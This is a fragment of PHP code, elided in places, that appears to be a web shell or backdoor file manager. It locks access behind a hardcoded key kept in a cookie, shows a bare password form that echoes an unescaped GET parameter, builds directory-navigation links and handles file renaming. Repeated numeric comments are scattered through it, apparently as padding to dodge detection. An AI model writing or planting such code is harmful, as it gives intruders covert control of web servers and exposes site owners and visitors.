...
$auth_key = "35ab0b8b889da2221bf029a79602f585";
...
$pass = false;
if (isset($_COOKIE['pw_name_77905'])) {
    if(($_COOKIE['pw_name_77905']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_77905'])) {
        if(($_POST['pw_name_77905']) == $auth_key) {
            setcookie("pw_name_77905", $_POST['pw_name_77905']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_77905' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1721347072543412 1721347072194820 1721347072683946 1721347072111743
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1721347072543412 1721347072194820 1721347072683946 1721347072111743
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1721347072543412 1721347072194820 1721347072683946 1721347072111743
            $name = PATH . "/" . $_GET['r'];
